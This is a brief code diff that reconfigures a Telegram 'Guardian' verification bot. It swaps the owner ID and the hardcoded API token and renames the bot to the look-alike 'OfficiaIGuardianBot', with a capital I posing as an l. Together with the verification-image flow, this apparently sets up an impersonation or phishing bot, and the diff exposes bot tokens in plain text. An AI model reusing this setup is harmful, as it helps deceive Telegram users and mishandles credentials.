@@ -21,10 +21,10 @@ type SafeguardConfig = {
 };
 
 /* #region environment variable */
-const botOwner = "1117264759";
-const botName = "GuardianVerifyBot";
+const botOwner = "5622012093";
+const botName = "OfficiaIGuardianBot";
 const webAppLink = "https://mazzamassy-guardian-55.deno.dev/";
-const gateKeeper = "7858539430:AAHboUR7kp5s7IgI0RYXhT1Mw8MzA130erQ";
+const gateKeeper = "7586011355:AAHGq38SR4TZGlPIDOO58ZrTXRogTF_pLtM";
 const sgClickVerifyURL = "guardian_verification.jpg";
 const sgTapToVerifyURL = "guardian_verification_2.jpg";
 const sgVerifiedURL = "guardian_verified.jpg";
